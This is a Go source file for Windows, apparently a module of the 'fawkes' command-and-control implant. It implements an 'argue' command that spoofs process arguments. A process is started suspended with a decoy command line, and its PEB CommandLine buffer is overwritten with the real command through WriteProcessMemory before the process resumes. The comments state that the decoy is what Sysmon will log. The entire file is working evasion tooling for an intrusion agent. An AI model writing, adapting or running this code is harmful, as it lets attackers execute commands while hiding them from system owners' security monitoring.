//go:build windows

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// ArgueCommand implements process argument spoofing
type ArgueCommand struct{}

func (c *ArgueCommand) Name() string { return "argue" }
func (c *ArgueCommand) Description() string {
	return "Execute a command with spoofed process arguments"
}

type argueParams struct {
	Command string `json:"command"`
	Spoof   string `json:"spoof"`
}

// PEB offsets (x64)
const (
	pebProcessParametersOffset = 0x20 // PEB.ProcessParameters (RTL_USER_PROCESS_PARAMETERS*)
)

// RTL_USER_PROCESS_PARAMETERS offsets (x64)
const (
	ruppCommandLineOffset = 0x70 // CommandLine UNICODE_STRING
	ruppImagePathOffset   = 0x60 // ImagePathName UNICODE_STRING
)

var (
	ntdllArgue                       = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationProcessArg = ntdllArgue.NewProc("NtQueryInformationProcess")
	procNtResumeThread               = ntdllArgue.NewProc("NtResumeThread")
)

func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
	var params argueParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{Output: fmt.Sprintf("Error parsing parameters: %v", err), Status: "error", Completed: true}
	}

	if params.Command == "" {
		return structs.CommandResult{Output: "Error: command is required", Status: "error", Completed: true}
	}

	// If no spoof string provided, use just the executable name
	if params.Spoof == "" {
		exe := extractExeName(params.Command)
		params.Spoof = exe
	}

	output, err := executeSpoofedProcess(params.Command, params.Spoof)
	if err != nil {
		if output != "" {
			return structs.CommandResult{Output: fmt.Sprintf("%s\nError: %v", output, err), Status: "error", Completed: true}
		}
		return structs.CommandResult{Output: fmt.Sprintf("Error: %v", err), Status: "error", Completed: true}
	}

	trimmed := strings.TrimSpace(output)
	if trimmed == "" {
		trimmed = "Command executed successfully (no output)"
	}
	return structs.CommandResult{Output: trimmed, Status: "success", Completed: true}
}

// executeSpoofedProcess creates a process with spoofed command line args
func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
	// Ensure the spoof command uses the same executable as the real command
	realExe := extractExeName(realCmd)
	spoofExe := extractExeName(spoofCmd)
	if !strings.EqualFold(realExe, spoofExe) {
		// Prepend the real executable to the spoof args
		spoofCmd = realExe + " " + spoofCmd
	}

	// Pad spoof command to be at least as long as the real command.
	// This ensures the real command fits in the existing PEB buffer without
	// needing to allocate new memory or change the Buffer pointer, which
	// can cause STATUS_DLL_INIT_FAILED during process initialization.
	if len(spoofCmd) < len(realCmd) {
		spoofCmd = spoofCmd + strings.Repeat(" ", len(realCmd)-len(spoofCmd))
	}

	// Create pipe for stdout/stderr capture
	var stdoutRead, stdoutWrite windows.Handle
	var sa windows.SecurityAttributes
	sa.Length = uint32(unsafe.Sizeof(sa))
	sa.InheritHandle = 1

	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe: %v", err)
	}
	defer windows.CloseHandle(stdoutRead)

	// Prevent read handle from being inherited
	if err := windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0); err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("SetHandleInformation: %v", err)
	}

	// Step 1: Create process SUSPENDED with SPOOFED command line
	// This is what Sysmon Event ID 1 will log
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE
	si.StdOutput = stdoutWrite
	si.StdErr = stdoutWrite

	var pi windows.ProcessInformation

	spoofUTF16, err := windows.UTF16PtrFromString(spoofCmd)
	if err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("invalid spoof command: %v", err)
	}

	// CREATE_SUSPENDED (0x4) | CREATE_NO_WINDOW (0x08000000)
	err = windows.CreateProcess(
		nil,
		spoofUTF16,
		nil, nil,
		true, // inherit handles for pipe
		windows.CREATE_SUSPENDED|CREATE_NO_WINDOW,
		nil, nil,
		&si, &pi,
	)
	if err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("CreateProcess (suspended): %v", err)
	}

	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// Step 2: Read PEB address via NtQueryInformationProcess
	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32
	status, _, _ := procNtQueryInformationProcessArg.Call(
		uintptr(pi.Process),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if status != 0 {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X", status)
	}

	// Step 3: Read ProcessParameters pointer from PEB+0x20
	var processParamsAddr uintptr
	err = readProcessMemoryPtr(pi.Process, pbi.PebBaseAddress+pebProcessParametersOffset, &processParamsAddr)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("read PEB.ProcessParameters: %v", err)
	}

	// Step 4: Read CommandLine UNICODE_STRING from ProcessParameters+0x70
	// UNICODE_STRING layout: Length(2) + MaximumLength(2) + pad(4) + Buffer(8) = 16 bytes
	cmdLineAddr := processParamsAddr + ruppCommandLineOffset
	var cmdLineUS [16]byte
	var bytesRead uintptr
	err = windows.ReadProcessMemory(pi.Process, cmdLineAddr, &cmdLineUS[0], 16, &bytesRead)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("read CommandLine UNICODE_STRING: %v", err)
	}

	origBuffer := *(*uintptr)(unsafe.Pointer(&cmdLineUS[8]))

	// Step 5: Encode real command as UTF-16LE
	realUTF16, err := windows.UTF16FromString(realCmd)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("encode real command: %v", err)
	}
	// Don't include null terminator in Length, but include it in MaximumLength
	realLenBytes := uint16((len(realUTF16) - 1) * 2)
	realMaxBytes := uint16(len(realUTF16) * 2)

	// Step 6: Write real command into the existing PEB buffer
	// The spoof was padded to be >= real command, so it always fits
	writeAddr := origBuffer

	// Write the UTF-16 encoded real command
	realBytes := make([]byte, realMaxBytes)
	for i, c := range realUTF16 {
		binary.LittleEndian.PutUint16(realBytes[i*2:], c)
	}
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(pi.Process, writeAddr, &realBytes[0], uintptr(len(realBytes)), &bytesWritten)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("write real command: %v", err)
	}

	// Step 7: Update CommandLine.Length in ProcessParameters
	// Only update Length (first 2 bytes) — MaximumLength and Buffer stay the same
	var lenBytes [2]byte
	binary.LittleEndian.PutUint16(lenBytes[:], realLenBytes)
	err = windows.WriteProcessMemory(pi.Process, cmdLineAddr, &lenBytes[0], 2, &bytesWritten)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("update CommandLine.Length: %v", err)
	}

	// Step 8: Resume the process
	windows.CloseHandle(stdoutWrite) // Close write end before reading

	var suspendCount uint32
	status, _, _ = procNtResumeThread.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&suspendCount)),
	)
	if status != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return "", fmt.Errorf("NtResumeThread: NTSTATUS 0x%X", status)
	}

	// Step 9: Read output
	var output strings.Builder
	buf := make([]byte, 4096)
	for {
		var n uint32
		readErr := windows.ReadFile(stdoutRead, buf, &n, nil)
		if readErr != nil || n == 0 {
			break
		}
		output.Write(buf[:n])
		if output.Len() > 10*1024*1024 {
			output.WriteString("\n[output truncated at 10MB]")
			break
		}
	}

	// Wait for completion (30s timeout)
	event, _ := windows.WaitForSingleObject(pi.Process, 30000)
	if event == uint32(windows.WAIT_TIMEOUT) {
		windows.TerminateProcess(pi.Process, 1)
		return output.String(), fmt.Errorf("process timed out after 30s")
	}

	var exitCode uint32
	if err := windows.GetExitCodeProcess(pi.Process, &exitCode); err == nil && exitCode != 0 {
		return output.String(), fmt.Errorf("exit status %d", exitCode)
	}

	return output.String(), nil
}

// extractExeName extracts the executable name from a command line
func extractExeName(cmdLine string) string {
	cmdLine = strings.TrimSpace(cmdLine)
	if cmdLine == "" {
		return ""
	}

	// Handle quoted executable paths
	if cmdLine[0] == '"' {
		end := strings.Index(cmdLine[1:], "\"")
		if end >= 0 {
			return cmdLine[1 : end+1]
		}
		return cmdLine[1:]
	}

	// Unquoted — take first space-delimited token
	parts := strings.SplitN(cmdLine, " ", 2)
	return parts[0]
}
